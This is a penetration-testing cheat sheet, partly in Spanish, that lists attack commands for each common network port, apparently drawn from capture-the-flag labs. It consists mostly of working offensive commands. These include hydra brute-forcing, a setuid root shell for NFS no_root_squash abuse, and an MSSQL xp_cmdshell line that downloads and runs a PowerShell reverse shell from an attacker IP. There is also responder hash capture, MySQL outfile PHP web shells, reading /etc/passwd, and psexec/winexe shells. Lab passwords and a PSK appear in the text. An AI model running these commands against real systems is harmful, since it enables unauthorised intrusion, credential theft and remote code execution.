---
title: COMMON PORTS
category: enum
order: 1
---
# FTP
### 21

---


## client
```
ftp -p 10.10.10.15
```
* check if can upload  (put)
* anon logins
* maybe ftp bounce if needed
* bruteforce
* check if version is exploitable(ex ftp-vuln-cve2010-4221.nse,ftp-vsftpd-backdoor.nse)


## ftp bounce
We can make an arbritary FTP server port scan another server for us

```
root@bha:~# nmap -T0 -v -b username:password@ftpserver.tld:21 victim.tld
```

# SSH
### 22
___

## hydra bruteforce
```
root@kali:~# hydra -s 50220 -L users.txt  -P passwords.txt  <ip a donde atacar> <protocol>

  -l user
  -s port
  -L list of user
  -p password
  -P list of passwords

```

# Telnet
### 23
___
```
root@kali:~# telnet <ip> <puerto>
```
## telnet login msf
```
use auxiliary/scanner/telnet/telnet_login
```

## nmap NSE
```
telnet-brute.nse
telnet-encryption.nse
telnet-ntlm-info.nse
```

#  DNS
### 53
___
## whois
```
root@kali:  whois <domain>
root@kali:  whois <ip>

```

## Dig
```
root@kali: dig axfr @dns-server domain.name
```
```
dig -x 10.10.10.13 @10.10.10.13
```
## nslookup
```
root@kali:  nslookup <domain>
```
or
```
root@kali:    nslookup
>set type=mx  (mail)
uocra.org

>set type=ns (dns)
uocra.org
```


## Zone transfer
```
    host -t ns uocra.org
    host -l uocra.org  <dns to get the transfer>
```

## dnsrecon
```
 root@kali:# dnsrecon -d megacorpone.com -t axfr
```

## the harvester
scrapea mails y mucha data

```
 :~#theharvester -d cisco.com -l 500 -b all
```

## Recon-ng

webreconnaissance framework written in python
```
$ recon-ng  <to start
$ help < to see help
$ show modules
$ load modules
$ use [module]
$ show info
$ set source  
$ run
```


## nmap
- dns hostname lookup  
  ```
  nmap -F --dns-server <dns server ip> <target ip range>`
  ```

-  Host Lookup  
       ```host -t ns megacorpone.com
       ````

-  Reverse Lookup Brute Force - find domains in the same range  
        ```for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
        ```

-  Perform DNS IP Lookup
```
dig a domain-name-here.com @nameserver
```

-  Reverse lookup
```
dig -x 10.10.10.13 @nameserver
```

-  Perform MX Record Lookup
```
dig mx domain-name-here.com @nameserver
```

-  Perform Zone Transfer with DIG
```
dig axfr domain-name-here.com @nameserver
```

-  Windows DNS zone transfer
```
nslookup -> set type=any -> ls -d blah.com
```

-  Linux DNS zone transfer
```
dig axfr blah.com @ns1.blah.com
```

-  Dnsrecon DNS Brute Force subdomain
```
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

-  Dnsrecon DNS List of megacorp
```
dnsrecon -d megacorpone.com -t axfr
```

-  DNSEnum
```
dnsenum zonetransfer.me
```



# SMB/netbios
### tcp: 138,139, 445 udp: 137,138
___

permite anonymous login

The NetBIOS API and the SMB protocol are generally used together as follows:

1. An SMB client will use the NetBIOS API to send an SMB command to an SMB server, and to listen for replies from the SMB server.
2. An SMB server will use the NetBIOS API to listen for SMB commands from SMB clients, and to send replies to the SMB client.

you'll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP

## nmap
```
root@kali:~# nmap -v -p 139,445 --script smb-vuln-* 192.168.56.101
```
## nbtscan
```
root@kali nbtscan -r 192.168.11.0/24
```
## enum4linux
```
root@kali:~# enum4linux -a 192.168.56.101
```
## smbmap
```
smbmap -H 10.10.10.161
ADMIN$
C$
Data
```
```
smbmap -H 10.10.10.16 -R DATA #recursive search
smbmap -H 10.10.10.16 -R DATA --download 'Data\\Search\\archivo.txt'
```
* with credentials
```
smbmap -u Tempuser -p Welcome123 -H 10.10.10.16 -R DATA
```

* enumerating
```
smbmap -d active.htb -u SVC_TGS -p GPPsaras2012 -H 10.10.10.100
```

## smbclient
```
smbclient \\\\$ip\\$share -I target -N
smbclient -N -L 192.168.168.168 - lists smb type (often displaying samba version) and various shares
```
mount
```
smbclient \\\\secnotes.htb\\new-site -U anonymous
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

## rpcclient
```
rpcclient -U "" target
```
## Mount shares
```
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
```

## mount shares 2
```
sudo apt-get install cifs-utils
mkdir /mnt/Replication
mount -t cifs //10.10.10.100/Replication /mnt/Replication -o
username=<username>,password=<password>,domain=active.htb
grep -R password /mnt/Replication/
```

## nmblookup
nmblookup is used to query NetBIOS names and map them to IP addresses in a network using NetBIOS over TCP/IP queries
```
 nmblookup -A target
```
## accesschk
```
accesschk -v -t (target IP) -u user -P /usr/share/dirb/wordlists/common.txt - attempts to connect to $IPC or $ADMIN shares
```

## shell when we have the credentials
```
root@kali:# psexec.py secnotes/administrator:@secnotes.htb
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
```
## shell 2 when i have credentials
```
winexe -U Administrator //10.0.0.0 "cmd.exe"
```
If SMB is up locally but the port is closed externally, then try a remote port forward back to your attacking machine:
```
plink.exe -l sshproxy -pw sshproxy -R 445:127.0.0.1:445 10.10.10.10
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

# SNMP  
### UDP 161 169
___

## snmp parameters
```
1.3.6.1.2.1.25.1.6.0    System    Processes
1.3.6.1.2.1.25.4.2.1.2    Runng    Programs
1.3.6.1.2.1.25.4.2.1.4    Processes       Path
1.3.6.1.2.1.25.2.3.1.4    Storage         Units
1.3.6.1.2.1.25.6.3.1.2    Softwre            Name
1.3.6.1.4.1.77.1.2.25    User           Accounts
1.3.6.1.2.1.6.13.1.3   TCP      Local          Ports
```
## MIB TREE
snmp management information base (mib) is a database containing information usually related to network management.

## scaning for snmp
```
nmap -sU --open -p 161 192.168.45.101-190 -oG mega-snmp.txt
```

## onesixtyone
```
root:kali echo public > comunity
root:kali echo private >> comunity
root:kali echo manager >> comunity
root:kali for ip in $(seq 200 254); do echo 192.168.56.$ip;done > ips
root:kali onexityone -c comunity -i ips
```

## snmp enumeration

```
snmpwalk -c public -v1 <ip>
```
enumeration windows users
```
snmpwalk -c public -v1 192.168.56.101 1.3.6.1.4.1.77.1.2.25  
```
runin process
```
snmpwalk -c public -v1 192.168.56.101 1.3.6.1.2.1.25.4.2.1.2  
```
open tcp ports
```
snmpwalk -c public -v1 192.168.56.101   1.3.6.1.2.1.6.13.1.3  
```
proceses
```
snmpwalk -c public -v1 192.168.56.101  1.3.6.1.2.1.25.4.2.1.2
```

```
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
```

ipv6
```
Most importantly, an IPv6 address is exposed at MiB ​ iso.3.6.1.2.1.4.34.1.5.2.16​ .
```


#  TFTP
### UDP 69
___

- idem FTP


#  Email
### 25/587, 110/995 , 143/993
___

SMTP, POP3(s) and IMAP(s) are good for enumerating users.

Also: ***CHECK VERSIONS*** and `searchsploit`

## 1. SMTP

smtp soporta comandos como VRFY y EXPN  
vrfy request ask the server to verify an email addres.  
EXPN ask the server fot the membership of a mailing list.  

ex
```
nv -nv 192.168.11.215 25
VRFY root
```
### **smtp-user-enum**
```
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```


### sending an email

```
HELO my.server.com
MAIL FROM: <me@mydomain.com>
RCPT TO: <you@yourdomain.com>
DATA
From: Danny Dolittle
To: Sarah Smith
Subject: Email sample
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii

This is a test email for you to read.
.
QUIT
```


### Open relay

```
use auxiliary/scanner/smtp/smtp_relay
services -p 25 -u -R
```
or nmap
```
nmap -iL email_servers -v --script=smtp-open-relay -p 25
```


### NSE
```
smtp-brute.nse
smtp-commands.nse
smtp-enum-users.nse
smtp-ntlm-info.nse
smtp-open-relay.nse
smtp-strangeport.nse
smtp-vuln-cve2010-4344.nse
smtp-vuln-cve2011-1720.nse
smtp-vuln-cve2011-1764.nse
```

###  commands
```
ATRN   Authenticated TURN
AUTH   Authentication
BDAT   Binary data
BURL   Remote content
DATA   The actual email message to be sent. This command is terminated with a line that contains only a .
EHLO   Extended HELO
ETRN   Extended turn
EXPN   Expand
HELO   Identify yourself to the SMTP server.
HELP   Show available commands
MAIL   Send mail from email account
MAIL FROM: me@mydomain.com
NOOP   No-op. Keeps you connection open.
ONEX   One message transaction only
QUIT   End session
RCPT   Send email to recipient
RCPT TO: you@yourdomain.com
RSET   Reset
SAML   Send and mail
SEND   Send
SOML   Send or mail
STARTTLS
SUBMITTER      SMTP responsible submitter
TURN   Turn
VERB   Verbose
VRFY   Verify
```

## 2 POP

### nse
```
pop3-brute.nse
pop3-capabilities.nse
pop3-ntlm-info.nse

```
### comands
```
USER   Your user name for this mail server
PASS   Your password.
QUIT   End your session.
STAT   Number and total size of all messages
LIST   Message# and size of message
RETR message#  Retrieve selected message
DELE message#  Delete selected message
NOOP   No-op. Keeps you connection open.
RSET   Reset the mailbox. Undelete deleted messages.
```





# RPC/NFS y nfs
### 111  135 593 , 2049
---
protocolo para sistemas de archivos distribuidos


## scan
```
showmount -e someexample.com
```
## rpcinfo 111

installation
```
apt-get install rpcbind

apt-get install nfs-common
```

```
rpcinfo -p IP_Address
```

## rpcdump
by impacket
```
rpcdump.py 10.10.xx.xx
```
## nmap
```
nmap -Pn -sV -script=nfs*
```
## mount the nfs
```
mount  -o nolock <ip>:/path_remote   /path/local
```
```
$ mkdir backup
$ mount -o ro,noexec someexample.com:/backup backup
$ ls backup
backup.tar.bz2.zip
```
```
$ mount -t nfs someexample.com:/backup backup
```

## vulnerabilidad
chequear  “/etc/exports”
si tiene no_root_squash o no_all_squash y tenemos permisos de escritura se puede crear un ejecutable con setuid ej:

```
int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
```
```
chown root.root ./pwnme
chmod u+s ./pwnme
```

## nfshell
* install  https://github.com/NetDirect/nfsshell
```
root@kali:~/Downloads/nfsshell-master# apt-get install libreadline-dev libncurses5-dev
root@kali:~/Downloads/nfsshell-master# make
```
* use
```
root@kali:~# nfsshell
nfs> host 10.10.10.34
nfs> export
nfs> mount /loquefuere
```

# memcached
### 11211
---
memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.
## nmap nse

```
memcached-info
```

# ident
### 113
---
it gives you usernames that are connected to a tcp port.
https://en.wikipedia.org/wiki/Ident_protocol

## nmap
```
auth-owners.nse
```


# ipsec/IKE vpn  isakmp
### UDP 500
---
IPsec is the most commonly used technology for both gateway-to-gateway (LAN-to-LAN) and host to gateway (remote access) enterprise VPN solutions.  

IKE is a type of ISAKMP (Internet Security Association Key Management Protocol) implementation, which is a framework for authentication and key exchange. IKE establishes the security association (SA) between two endpoints through a three-phase process:

* Phase 1: Establish a secure channel between 2 endpoints using a Pre-Shared Key (PSK) or certificates. It can use main mode (3 pairs of messages) or aggresive mode messages).
* Phase1.5: This is optional, is called Extended Authentication Phase and authenticates the user that is trying to connect (user+password).
* Phase2: Negotiates the parameter for the data security using ESP and AH. It can use a different algorithm than the one used in phase 1 (Perfect Forward Secrecy (PFS)).




## 1 find valid info
```
ike-scan 10.10.10.116
```
* 0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway.
* 1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you  proposed are acceptable (a valid transform will be shown in the output)
* 0 returned handshake; 1 returned notify: VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).

## 2 bruteforce
if you dont get a valid transformation you can try to bruteforce it
```
./ikeforce.py -s1 -a <IP> #-s1 for max speed
```

## 3 server(vendor) fingerprint
```
ike-scan -M --showbackoff 10.10.10.116
```

## 4 bruteforce id with ike-scan
if running the above no hash is returned, bruteforce is probably goingn to work  
```
ike-scan -P -M -A -n fakeID 10.10.10.116
```
If some hash is returned, this means that a fake hash is going to be sent back fora fake ID, so this method won't be reliable to brute-force the ID.

to bruteforce:
```
python ikeforce.py 10.10.10.116 -e -w /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt
```
## 5 connecting
### strongswan
vpn stuff for linux

* /etc/ipsec.conf
```
conn Conceal
        type=transport
        keyexchange=ikev1
        right=10.10.10.116
        authby=psk
        rightprotoport=tcp
        leftprotoport=tcp
        esp=3des-sha1
        ike=3des-sha1-modp1024
        auto=start
```
* /etc/ipsec.secrets
```
10.10.10.116 : PSK "Dudecake1!"
```

* stop
```
ipsec stop
```
* start
```
ipsec start --nofork
```

#  MS-SQL
### 1433
---
## impacket
```
mssqlclient.py -windows-auth reporting@10.10.10.125
SQL>
```
## shell
```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

querier\mssql-svc
```

## sqsh
```
sqsh -S mssql -D MyDB -U DOMAIN\\testuser -P MyTestingClearPassword1
```
## mssql commands
```
select IS_SRVROLEMEMBER (​ 'sysadmin'​ ) # check permisions
```

## responder
steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.

* en kali:
```
responder -I tun0 -rv
```
* en windows
```
SQL>exec xp_dirtree '\\10.10.14.6\share\file'
SQL>exec xp_fileexist '\\10.10.16.2\share\file'
```


## mssql reverse shell
```
SQL> xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.6/Invoke-PowerShellTcp.ps1\")
```


## nmap nse
```
ms-sql-brute.nse
ms-sql-config.nse
ms-sql-dac.nse
ms-sql-dump-hashes.nse
ms-sql-empty-password.nse
ms-sql-hasdbaccess.nse
ms-sql-info.nse
ms-sql-ntlm-info.nse
ms-sql-query.nse
ms-sql-tables.nse
ms-sql-xp-cmdshell.nse
```


#  MongoDB
### 27017 27018
---
## nmap nse
```
mongodb-brute.nse
mongodb-databases.nse
mongodb-info.nse
```
ver web para sqli

#  ISCSI
### 3260
---

## nmap nse
```
iscsi-info.nse
```
## iscsiadm

```
iscsiadm -m discovery -t sendtargets -p 10.10.10.12
```


# SAP ROUTER
### 3299
---
TODO

# MySQL
### 3306
---

## shell
If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.
```
echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e

select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
```
**or**
```
SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
```

## tips
```
 select sys_exec('/bin/bash');
 bash -p or sudo su
 ```
## sqsh:
 ```
sqsh program: apt-get install sqsh freetds-bin freetds-common freetds-dev
usage:
add to the bottom of freetds.conf:
[hostname] host = 192.168.168.169
port = 2600
tds version = 8.0
edit ~/.sqshrc:
\set username=sa
\set password=password
\set style=vert
connect: sqsh -S hostname
```
```
sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G​
```

##  **file inclusion**
If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.

  ```
select load_file('/etc/passwd');
  ```
### nmap nse
```
mysql-audit.nse
mysql-brute.nse
mysql-databases.nse
mysql-dump-hashes.nse
mysql-empty-password.nse
mysql-enum.nse
mysql-info.nse
mysql-query.nse
mysql-users.nse
mysql-variables.nse
mysql-vuln-cve2012-2122.nse
```

# LDAP (application layer)
### 389
---

Lightweight Directory Access Protocol, gestiona el acceso a un servicio de directorios

## nmap  nse

```
ldap-rootdse.nse
ldap-search.nse
ldap-brute.nse
```
## ldapsearch

```
ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
-h ldap server
-p port of ldap
-x simple authentication
-b search base
-s scope is defined as base
```

* ex2
```
ldapsearch -x -h 10.10.10.100 -p 389 -D ​ 'SVC_TGS'​ -w ​ 'GPPstillStandingStrong2k18'
-b ​ "dc=active,dc=htb"​ -s sub
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.
4.803:=2)))"​ samaccountname | grep sAMAccountName
```

# EthernetIP
### 44818
---

Es un protocolo industrial que adapta el protocolo cip para automatizaacion de dispositivos industriales.

## nmap nse
```
enip-enumerate.nse
```
## defaults
```

    MicroLogix 1100: Default Username:password is administrator:ml1100
    MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is MicroLogix 1400 guest:guest is another default password.
```

# BACNet
### UDP 47808
---
BACnet is a communications protocol for Building Automation and Control (BAC) network

## nmap nse
```
BACnet-discover-enumerate.nse
```

# Rcomands berkley
###  512 513 514
---
Serie de programas para mandar comandos y loguearse a sistemas unix desde otra computadora por tcp. todo en texto plano

## rlogin
```
use auxiliary/scanner/rservices/rlogin_login
services -p 513 -u -R
```

## rsh
```
use auxiliary/scanner/rservices/rsh_login
services -p 514 -u -R
```
## rexec
```
auxiliary/scanner/rservices/rexec_login
services -p 512 -u -R
```

# PostgreSQL
### 5432
---

### nmap nse
```
pgsql-brute.nse
```


#  Apple Filing Protocol-appletalk (presentation layer)
### 548
---
Protocolo para intercambio de archivos y recursos en macos

## nmap
```
afp-brute.nse
afp-ls.nse
afp-path-vuln.nse
afp-serverinfo.nse
afp-showmount.nse
```


# RTSP
### 554
---
 Real Time Streaming Protocol, se usa para controlar sesiones multimedia (play, stop, pause,etc)

 ej client: curl, vlc,skype,spotify,youtube

## nmap
```
$ nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV
```

```
$ rtsp-url-brute.nse
```

## Cameradar
An RTSP surveillance camera access multitool

# HPDataProtectorRCE
### 5555
---
TODO

# VNC
### 5900
---

## vnc password
```
echo MYVNCPASSWORD | vncpasswd -f > ~/.secret/passvnc
Warning: password truncated to the length of 8.

cat ~/.secret/passvnc
kRS�ۭx8
```

```
vncviewer hostname-of-vnc-server -passwd ~/.secret/passvnc

```

#  X11
### 6000
---

## xspy
```
xspy 10.9.xx.xx
```

## xdpyinfo
```
xdpyinfo -display <ip>:<display>
```

## xwd
screenshot
```
xwd -root -display 10.20.xx.xx:0 -out xdump.xdump
```
## XWatchwin
live view
 ```
 ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```

#  Redis
### 6379
---
**TODO**


# Finger
### 79
---
la aplicacion finger es como who.
el protocolo te deja ver datos de usuarios

```
root@kali:~#  finger  root  10.10.10.15
```

podemos bruteforcear el rlogin  de 79
```
hydra -L rlogin-users.txt -P rockyou.txt rlogin://osiris.acme.com
```
o incluso antes armar una lista
```
for i in $(cat /usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt) ;do finger $i 10.10.10.76 >> finger-bruteforce.out;done
```

## NSE
```
finger.nse
```

# SIP
##5060
---
## Sipvicious
 SIP VoIP phones info
 ```
 svmap 10.10.10.7
 ```
 ```
 svwar -m INVITE -e100-300 10.10.10.7
 EXTENSION 233 PROBABLY EXIST
 ```
 Elastix Exploit needs the extension.
 https://www.exploit-db.com/exploits/18650/
```
beep privesc after elastix exploit
> sudo nmap --interactive
> !sh
```

#  rsync
### 873
---
if the remote host runs an rsync daemon, rsync clients can connect by opening a socket on TCP port 873

## nmap nse
```
rsync-list-modules.nse
```
#  Kerberos
### 88
---
Kerberos is a client server authentication protocol used by Windows Active Directory which
provides mutual authentication to all partie
## NSE
```
krb5-enum-users.nse
```
**TODO**


#  PJL
### 9100
---
## nmap nse
```
pjl-ready-message.nse
```


#  Apache Cassandra
### 9160
---
## nmap nse
```
cassandra-info.nse
cassandra-brute.nse
```

# Multicast DNS (mDNS)
### UDP 5353
---


# ndmp
### 10000 Network Data Management Protocol
---
NDMP, or Network Data Management Protocol, is a protocol meant to transport data between network attached storage (NAS)

## nmap
```
ndmp-fs-info.nse
ndmp-version
```
